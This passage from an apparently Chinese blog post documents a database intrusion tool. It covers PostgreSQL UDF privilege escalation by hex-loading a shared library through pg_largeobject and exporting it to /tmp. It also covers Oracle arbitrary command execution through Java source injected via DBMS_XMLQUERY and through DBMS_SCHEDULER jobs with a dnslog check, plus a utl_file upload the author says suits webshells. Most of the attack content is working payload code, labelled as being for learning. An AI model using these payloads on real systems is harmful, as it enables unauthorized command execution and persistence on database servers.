    chunksize = int(200*megabytes)#default chunksize
    def split(fromfile,todir,chunksize=chunksize):
        if not os.path.exists(todir):#check whether todir exists or not
            os.mkdir(todir)
        else:
            for fname in os.listdir(todir):
                os.remove(os.path.join(todir,fname))
        partnum = 0
        inputfile = open(fromfile,'rb')#open the fromfile
        while True:
            chunk = inputfile.read(chunksize)
            if not chunk:             #check the chunk is empty
                break
            partnum += 1
            filename = os.path.join(todir,('part%04d'%partnum))
            fileobj = open(filename,'wb')#make partfile
            fileobj.write(chunk)         #write data into partfile
            fileobj.close()
        return partnum
    if __name__=='__main__':
            fromfile  = input('File to be split?')
            todir     = input('Directory to store part files?')
            chunksize = int(input('Chunksize to be split?'))
            absfrom,absto = map(os.path.abspath,[fromfile,todir])
            print('Splitting',absfrom,'to',absto,'by',chunksize)
            try:
                parts = split(fromfile,todir,chunksize)
            except:
                print('Error during split:')
                print(sys.exc_info()[0],sys.exc_info()[1])
            else:
                print('split finished:',parts,'parts are in',absto)
    ## file2hex
    import binascii,os
    fh = open(r"1/part0006", 'rb')
    a = fh.read()
    hexstr = binascii.b2a_hex(a)
    print(hexstr)
SQL实现为：
    SELECT lo_create(1234)
    insert into pg_largeobject values (1234, 0, decode('...', 'hex'));
    insert into pg_largeobject values (1234, 1, decode('...', 'hex'));
    SELECT lo_export(1234, '/tmp/test123.so');
    CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/test123.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
    select sys_eval('id')
部署环境比较麻烦，所以只做了 Linux 下的 postgresql-12 的 udf 提权，作为学习使用
## 0x03 Oracle
### 3.1 命令执行
Oracle 命令执行主要使用的是 DBMS_XMLQUERY 和 DBMS_SCHEDULER。
#### DBMS_XMLQUERY
利用 DBMS_XMLQUERY.newcontext() 可以执行任意 sql 语句，因此在无需堆叠的情况下，通过 select
dbms_xmlquery.newcontext(sql) from dual 就可以创建 JAVA source 和 存储过程实现 JAVA
功能，通过调用可以实现基于JAVA的代码执行。
创建过程如下：
    string sql1 = "select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named \"SysUtil\" as import java.io.*; public class SysUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str +=stemp+\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual";
    string sql2 = "select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function SysRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''SysUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual";
实现效果如图：
但执行 taklist /svc 仍然会出错，主要是因为在执行命令返回的字符串中存在截断，某些特定的命令，通过 wmic
查询也可以实现，因此设计了快速执行按钮，调用 wmic 实现查询进程、查看用户、查看补丁和查看系统版本，如图：
#### DBMS_SCHEDULER
DBMS_SCHEDULER 可以定时执行任务，格式如下：
    BEGIN DBMS_SCHEDULER.CREATE_JOB(
        JOB_NAME=>'xxx',
        JOB_TYPE=>'EXECUTABLE',
        ENABLED =>TRUE,
        AUTO_DROP =>FALSE,
        JOB_ACTION=>'{cmd}',
        NUMBER_OF_ARGUMENTS => 0)
因此通过此方法可以执行任意命令，但有两个需要注意的点：
  * 无回显
  * 由于执行时并未规定 cmd 路径，因此执行时输入的命令应为：ping.exe xxx.dnslog.cn 或 cmd.exe /c echo 1 > 1.txt
由于无回显，在现在网上流传的 Oracle 连接工具中都没有判断命令是否执行成功的标识。实际上在 CREATE_JOB 后是可以通过
    select job_name,state from user_scheduler_jobs where JOB_NAME = 'xxx';
来判断 JOB 是否创建成功以及是否在运行或者已经运行结束的，因此根据下列逻辑就可以判断出命令是否成功执行:
    while (reader.Read())
    {
        job_name = reader.GetString(0).ToLower();
        job_state = reader.GetString(1).ToLower();
    }
    if (job_name == "")
    {return "0";}
    else if (job_state == "running" || job_state == "succeeded")
    {return "1";}
    else
    {return "-1";}
### 3.2 文件管理
#### 查看目录
查看目录采取的也是DBMS_XMLQUERY.newcontext() 创建 JAVA source 和 存储过程实现 JAVA功能。
    string sql1 = "select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named \"FileUtil\" as import java.io.*; public class FileUtil extends Object{public static String filemanager(String path) {String res = \"\";try{File file = new File(path);File[] listFiles = file.listFiles();for (File f : listFiles) {if(f.isDirectory()){res += \"d --> \" + f.getName()+\"\\n\";}else{res += \"f --> \" + f.getName() + \"\\n\";}}return res;}catch(Exception e){return e.toString();}}}'';commit;end;') from dual";
实现如图：
#### 上传文件
从根本上来说，由于可以创建 JAVA source，理论上所有的功能都可以通过这个方法来实现，但是这里上传文件利用的是 utl_file。
Oracle 官方介绍中也说了， utl_file 可以实现读取或写入操作系统文本文件，由于使用 utl_file.open()
打开文件最大字符数为32767，因此上传时最多只能上传32KB的文本文件。这个功能用来上传webshell已经是足够了。
目标路径只需要填写需要上传的文件夹，点击选择上传后可以打开文件夹选定要上传的文件，上传后的文件名与打开的文件一致，上传成功后 Log窗口会有提示：
代码为：
    string sql = "create or replace directory TESTFILE as '" + path + "'";
    string sql2 = "DECLARE \nfilehandle utl_file.file_type;\nbegin\nfilehandle := utl_file.fopen('TESTFILE', '" + filename + "', 'w',32767); utl_file.put(filehandle, '" + file + "');utl_file.fclose(filehandle);end; ";
### 3.3 后续
由于Oracle 特性，可以做到任意JAVA代码执行，做到这个相当于可以自己写入JAVA代码，完成任意功能，现在网上关于 Oracle
连接利用的工具大多数都是采用这一方法。因此工具后续的目标是把这个功能从固定代码改成可自定义代码，实现一劳永逸的效果。
## 0x04 参考
[2015_06251711341945.pdf
(nsfocus.com.cn)](https://www.nsfocus.com.cn/upload/contents/2015/06/2015_06251711341945.pdf)
[渗透过程中Oracle数据库的利用
Loong716](https://loong716.top/posts/Oracle_Database_Security/#0x04-命令执行)
[PostgreSQL入门及提权_weixin_34075268的博客-CSDN博客](https://blog.csdn.net/weixin_34075268/article/details/89628671)
* * *